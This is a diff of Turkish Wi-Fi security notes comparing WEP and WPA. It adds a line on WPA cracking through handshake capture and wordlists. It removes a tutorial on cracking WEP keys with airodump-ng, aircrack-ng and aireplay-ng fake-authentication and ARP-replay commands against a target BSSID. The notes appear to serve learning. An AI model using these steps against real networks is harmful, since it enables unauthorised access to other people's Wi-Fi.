@@ -1,6 +1,6 @@
-- Wifi ağları **WEP** ve **WPA/WPA2** ile şifreleme algoritmaları ile korunur.
----
+- WPA ile korunan bir modemin kırılması için ***handshake** sağlanır*, ardından ***wordlist** ile parola kırılmaya çalışılır.
 
+---
 ## 🔐 WPA ve WEP Arasındaki Fark 
 ### 🧓 WEP (Wired Equivalent Privacy) – Eski ve Güvensiz 🚫
 
@@ -49,47 +49,3 @@
 
 ---
 
-## 🧨 WEP Kırma
-
-### 1. 📡 Modemi Dinleme
-- `airodump-ng` ile ağları dinle:
-  ```bash
-  airodump-ng <interface>
-  ```
-- Ekrandaki hedef modem bilgilerini (BSSID ve kanal) not al.
-- Hedef ağı dinle ve yazdır :
-  ```bash
-  airodump-ng --channel <channel> --bssid <bssid> --write <txt> <interface>
-  ```
-### 2. 📥 Paket Toplama ve Şifreyi Kırma
-- Dinleme sırasında `.cap` uzantılı bir dosya oluşur.
-- Bu dosyayla şu komutu çalıştır:
-  ```bash
-  aircrack-ng dosya.cap
-  ```
-- 🗝️ Şifre doğrudan terminalde görünür!
-
-⚠️ **Not:** Bu işlemin çalışması için ağda **aktif trafik** olması gerekir.
-
----
-
-## 🕵️‍♂️ Fake Authentication (Sahte Kimlik Doğrulama)
-
-Ağda yeterli trafik yoksa kendin oluşturabilirsin. İşte adımlar:
-
-### 🔐 1. Sahte Bağlantı Kurma
-```bash
-aireplay-ng --fakeauth 0 -a (BSSID) -h (Wi-Fi kart MAC) (interface)
-```
-- 📡 Modeme sahte bir şekilde bağlanır.
-- MAC adresini öğrenmek için:
-  ```bash
-  ip addr
-  ```
-
-### 🔁 2. ARP Replay ile Trafik Oluşturma
-```bash
-aireplay-ng --arpreplay -b (BSSID) -h (Wi-Fi kart MAC) (interface)
-```
-- 💣 Modemde **sahte veri trafiği** oluşturur.
-- Bu sayede şifreleme kırılabilir hale gelir.
